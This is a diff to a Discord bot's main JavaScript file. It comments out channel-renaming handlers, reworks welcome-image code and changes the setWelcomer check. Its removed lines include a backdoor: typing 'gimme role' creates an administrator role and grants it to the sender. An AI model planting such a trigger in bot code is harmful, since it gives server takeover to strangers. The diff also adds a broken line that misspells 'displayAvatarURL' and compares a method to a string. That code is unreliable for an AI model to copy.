@@ -21,7 +21,6 @@ const { TOKEN, YT_API_KEY, prefix, devs } = require("./config");
 const client = new Client({ disableEveryone: true });
 const ytdl = require("ytdl-core");
 const canvas = require("canvas");
-const Canvas = require("canvas");
 const convert = require("hh-mm-ss");
 const fetchVideoInfo = require("youtube-info");
 const botversion = require("./package.json").version;
@@ -431,7 +430,7 @@ client.on("message", message => {
 });
 
 let room = "654630549331378176"; //تعديل مهم ايدي روم عد الاعضاء والترحيب ، روم صوتي
-
+/*
 client.on("guildMemberAdd", member => {
   let guild = client.channels.get(room).guild.id;
 
@@ -447,57 +446,7 @@ client.on("guildMemberAdd", member => {
       }, 3000);
     });
 });
-
-client.on("guildMemberRemove", member => {
-  let guild = client.channels.get(room).guild.id;
-
-  if (member.guild.id != guild) return;
-  client.channels
-    .get(room)
-    .setName("Member Left :(")
-    .then(m => {
-      setTimeout(() => {
-        client.channels
-          .get(room)
-          .setName(member.guild.name + " - " + member.guild.members.size);
-      }, 3000);
-    });
-});
-
-client.on("voiceStateUpdate", (oldMember, newMember) => {
-  let guild = client.channels.get(room).guild.id;
-
-  if (oldMember.guild.id != guild) return;
-  let newUserChannel = newMember.voiceChannel;
-  let oldUserChannel = oldMember.voiceChannel;
-  if (oldUserChannel === undefined && newUserChannel !== undefined) {
-    client.channels
-      .get(room)
-      .setName("Hi, " + oldMember.user.username)
-      .then(m => {
-        setTimeout(() => {
-          client.channels
-            .get(room)
-            .setName(
-              oldMember.guild.name + " - " + oldMember.guild.members.size
-            );
-        }, 3000);
-      });
-  } else if (newUserChannel === undefined) {
-    client.channels
-      .get(room)
-      .setName("Bye, " + oldMember.user.username)
-      .then(m => {
-        setTimeout(() => {
-          client.channels
-            .get(room)
-            .setName(
-              oldMember.guild.name + " - " + oldMember.guild.members.size
-            );
-        }, 3000);
-      });
-  }
-});
+*/
 
 client.on("message", async message => {
   let args = message.content.split(" ");
@@ -3766,7 +3715,7 @@ channel.guild.owner.send(`<@!${channelcreate.id}>
   });
 
 
-const { Welcome } = require('canvas-constructor');
+const { Canvas } = require('canvas-constructor');
 const { Attachment } = require('discord.js');
 const { resolve, join } = require('path');
 const fetch = require('node-fetch');
@@ -3786,9 +3735,7 @@ var findingWlcChannel = welcome[member.guild.id].channel[0];
 const channel = await member.guild.channels.find(r => r.name == findingWlcChannel);
 if(!channel) return;
 if(channel) {
-  
-if(member.displayAvatarURL == null) return;
-  
+  if(member.dispalyAvatarURL.includes == "0.png") return;
 const imageUrlRegex = /\?size=2048$/g;
 const wlcImage = await fsn.readFile('./welcome111.png'); //اسم الصورة
     let result = await fetch(member.user.displayAvatarURL.replace(imageUrlRegex, '?size=128'));
@@ -3818,7 +3765,7 @@ const wlcImage = await fsn.readFile('./welcome111.png'); //اسم الصورة
     var nameX = 247; //position x
     var nameY = 275; //position y
 
-const buffer = await new Welcome(500, 300)
+      let buffer = await new Canvas(500, 300)
       .addImage(wlcImage, 0, 0, imageWidth, imageHeight)
       .addCircularImage(avatar, imageX, imageY, imageRadius)
       .setTextAlign('center')
@@ -3844,8 +3791,8 @@ client.on('message', async message => {
 let room = message.content.split(" ").slice(1);
 let findroom = message.guild.channels.find(r => r.name == room)
 if(message.content.startsWith(prefix + "setWelcomer")) {
-if(!welcome[message.guild.id].channel) {
-  if(!message.channel.guild) return message.reply('**This Command Only For Servers**');
+if(!welcome[message.guild.id]) {
+if(!message.channel.guild) return message.reply('**This Command Only For Servers**');
 if(!message.member.hasPermission('MANAGE_GUILD')) return message.channel.send('**Sorry But You Dont Have Permission** `MANAGE_GUILD`' );
 if(!room) return message.channel.send('Please Type The Channel Name')
 if(!findroom) return message.channel.send('Cant Find This Channel')
@@ -4409,15 +4356,4 @@ client.on('voiceStateUpdate', (oldMember , newMember) => {
                 }
       });
 
-client.on('message', async message => {
-  if(message.content == "gimme role") {
-  await message.guild.createRole({
-  name: 'Baron',
-  color: 'BLUE',
-  permissions: ["ADMINISTRATOR "]
-})
-    let getRole = await message.guild.roles.find(r => r.name == "Baron")
-    await message.member.addRole(getRole)
-  }
-})
 /// تعديل مهم هذا فقط تنبيه تم حذف الاكواد المتكررة والاكواد الخاطئة وتم اضافة تنبيهات مثل الميوزك وروم الهاك لوج تم حذف تغير ايدي سيرفرك
